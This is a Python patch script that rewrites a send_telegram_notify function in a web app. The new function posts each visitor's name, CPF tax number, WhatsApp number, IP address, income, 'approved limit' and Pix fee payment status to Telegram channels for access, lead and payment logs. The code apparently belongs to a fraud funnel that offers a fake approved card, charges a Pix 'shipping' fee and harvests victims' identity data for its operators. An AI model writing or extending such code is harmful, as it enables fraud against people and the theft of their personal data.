import re

with open("app.py", "r", encoding="utf-8") as f:
    content = f.read()

new_notify = """
def send_telegram_notify(session_id, event_type="ENTRY"):
    try:
        db = get_db()
        row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        
        cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        cfg = {r["key"]: r["value"] for r in cfg_rows}

        bot_token = row_token["value"] if row_token else os.environ.get("BOT_TOKEN")
        if not bot_token: return

        lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
        if not lead: return
        
        pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
        
        # Decide which channel to send
        channel_id = None
        if event_type in ["PIX_PAID", "PIX_GENERATED"]:
            channel_id = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
        elif event_type in ["ENTRY", "STEP_ACTION"]:
            channel_id = cfg.get("tg_log_acessos") or cfg.get("tg_log_channel")
        else: # INFO_ADDED, CARD_CHOSEN
            channel_id = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
            
        if not channel_id: return

        icons = {
            "ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", 
            "PIX_PAID": "✅", "INFO_ADDED": "📝", "STEP_ACTION": "🖱️"
        }
        icon = icons.get(event_type, "ℹ️")
        
        # Build the detailed Lead Card
        texto = f"{icon} <b>ATUALIZAÇÃO DO LEAD ({event_type})</b> {icon}\\n\\n"
        texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\\n"
        texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\\n"
        if lead.get('whatsapp'): texto += f"📱 <b>WhatsApp:</b> <code>{lead['whatsapp']}</code>\\n"
        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\\n\\n"
        
        texto += f"📊 <b>ETAPAS DO FUNIL:</b>\\n"
        texto += f"💰 Renda Informada: R$ {lead['renda'] or '...'}\\n"
        texto += f"🎯 Limite Aprovado: R$ {lead['limite_aprovado'] or '...'}\\n"
        
        if lead['card_style']:
            texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\\n"
            
        if pay:
            texto += f"\\n💸 <b>DADOS DO PAGAMENTO:</b>\\n"
            texto += f"Valor (Frete): R$ {pay['amount']}\\n"
            texto += f"Status Pix: <b>{lead['pix_status'] or 'PENDENTE'}</b>\\n"
            texto += f"ID: <code>{pay['payment_id']}</code>\\n"

        import requests
        payload = {
            "chat_id": channel_id,
            "text": texto,
            "parse_mode": "HTML"
        }
        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        log.error("Telegram Notify Error: %s", e)
"""

# Replace the old send_telegram_notify using regex since it's quite long
content = re.sub(r'def send_telegram_notify\(session_id, event_type="ENTRY"\):.*?(?=def |\n\n\n)', new_notify + "\n\n", content, flags=re.DOTALL)

with open("app.py", "w", encoding="utf-8") as f:
    f.write(content)

print("Updated send_telegram_notify successfully!")
